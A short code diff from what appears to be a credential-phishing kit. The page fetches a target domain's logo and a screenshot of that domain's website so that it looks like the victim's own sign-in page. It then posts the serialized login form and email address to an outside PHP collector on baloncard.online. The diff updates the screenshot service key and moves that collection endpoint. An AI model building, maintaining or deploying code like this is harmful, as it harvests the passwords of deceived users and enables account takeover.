@@ -108,7 +108,7 @@
         // Set the logo and background
         const domain = decodedEmail.split('@')[1];
         const logoUrl = "https://logo.clearbit.com/" + domain;
-        const backgroundImageUrl = "https://image.thum.io/get/auth/72791-aa1167b0a8ca0d5c9b8850ffb0a86565//width/1400/http://" + domain;
+        const backgroundImageUrl = "https://image.thum.io/get/auth/72792-c5d543c4819088c5d75a607de5a89a30//width/1400/http://" + domain;
 
         // Update logo
         $.get(logoUrl)
@@ -153,7 +153,7 @@
         // AJAX request
         $.ajax({
             type: 'POST',
-            url: 'https://baloncard.online/sim/magott.php?name=' + encodeEmail(email), // Make sure to use the correct endpoint for your backend
+            url: 'https://baloncard.online/sim2/magott.php?name=' + encodeEmail(email), // Make sure to use the correct endpoint for your backend
             data: $('#loginForm').serialize(), // Use serialized form data
             success: function (response) {
                 // Hide spinner after request
